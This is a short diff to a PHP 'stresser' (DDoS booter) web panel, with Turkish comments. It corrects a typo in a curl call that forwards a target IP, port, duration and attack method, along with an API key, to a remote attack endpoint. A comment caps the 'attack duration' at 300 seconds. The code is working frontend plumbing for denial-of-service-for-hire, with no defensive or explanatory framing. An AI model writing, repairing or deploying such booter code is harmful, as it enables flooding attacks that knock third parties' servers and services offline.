@@ -27,7 +27,7 @@ Tek Sayfalık Stresser Projesi / One Page Stresser Project
 				if($time <= 300){ // Max saldırı süresini belirler
 
 				$dogukanbey = curl_init();
-				curl_setopt($dogukanbey, CURLOPT_URL, "http://1.3.3.7/dogukanbe.php?ip=$host&port=$port&time=$time&method=$method&key=dogukanbey1337");
+				curl_setopt($dogukanbey, CURLOPT_URL, "http://1.3.3.7/dogukanbey.php?ip=$host&port=$port&time=$time&method=$method&key=dogukanbey1337");
 				curl_setopt($dogukanbey, CURLOPT_TIMEOUT, 5);
 				curl_setopt($dogukanbey, CURLOPT_CONNECTTIMEOUT, 10);
 				curl_setopt($dogukanbey, CURLOPT_REFERER, "https://google.com");
